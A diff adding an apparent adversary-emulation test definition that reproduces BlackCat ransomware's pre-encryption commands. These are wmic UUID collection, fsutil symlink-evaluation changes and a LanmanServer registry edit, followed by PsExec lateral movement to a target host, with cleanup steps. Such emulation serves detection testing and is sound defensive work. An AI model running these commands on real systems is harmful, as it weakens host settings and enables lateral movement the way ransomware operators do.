@@ -1,0 +1,25 @@
+api_version: "2.0"
+name: BlackCat pre-encryption cmds with Lateral Movement
+description: This atomic attempts to emulate the unique behavior of BlackCat ransomware prior to encryption and during Lateral Movement attempts via PsExec on Windows. Uses bundled PsExec like BlackCat
+args:
+    - name: targethost
+      type: string
+      default: $ENV:COMPUTERNAME
+uuid: 31eb7828-97d7-4067-9c1e-c6feb85edc4b
+mitre:
+    tactics:
+        - 'TA0002: Execution'
+    techniques:
+        - 'T1569: System Services'
+    subtechniques:
+        - 'T1569.002: Service Execution'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: blackcat-pre-encryption-cmds-with-lateral-movement
+      inline: "cmd.exe /c \"wmic \tcsproduct \tget UUID\" \ncmd.exe /c \"fsutil behavior \tset SymlinkEvaluation R2L:1\" \ncmd.exe /c \"fsutil behavior set \tSymlinkEvaluation R2R:1\"\nreg    add    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f      \ncopy \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" $env:temp\ncmd.exe /c \"$env:temp\\psexec.exe  -accepteula  \\\\{{.Args.targethost}} cmd.exe  /c echo \"--access-token\"\"\n"
+      executor: powershell
+      cleanup:
+        inline: "reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v MaxMpxCt /f\ncmd.exe /c \"fsutil behavior set SymlinkEvaluation R2L:0\" \ncmd.exe /c \"fsutil behavior set SymlinkEvaluation R2R:0\"\nrm $env:temp\\psexec.exe\n"
+        executor: powershell
